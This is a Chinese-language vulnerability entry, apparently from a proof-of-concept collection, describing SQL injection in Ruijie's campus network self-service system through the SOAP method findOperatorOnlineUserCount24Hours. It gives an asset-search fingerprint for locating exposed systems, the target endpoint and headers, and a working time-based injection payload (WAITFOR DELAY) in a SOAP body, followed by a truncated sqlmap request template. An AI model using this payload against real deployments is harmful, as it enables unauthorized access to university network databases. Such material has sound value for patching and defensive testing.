# 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞

- **系统**：锐捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="校园网自助服务系统"`
- **请求**：`POST /selfservice/service/operatorReportorRoamService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 399`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
<soapenv:Body>
<ser:findOperatorOnlineUserCount24Hours>
<!--type: string-->
<ser:in0>gero et';WAITFOR DELAY '0:0:5'--</ser:in0>
</ser:findOperatorOnlineUserCount24Hours>
</soapenv:Body>
</soapenv:Envelope>

sqlmap
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host:
Content-Length: 399
<soapenv:Envelope xmlns:soapenv="http://…（脚本共 895 字，完整版见原文）
```

**其他**
- 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 锐捷网络股份有限公司校园网自助服务系统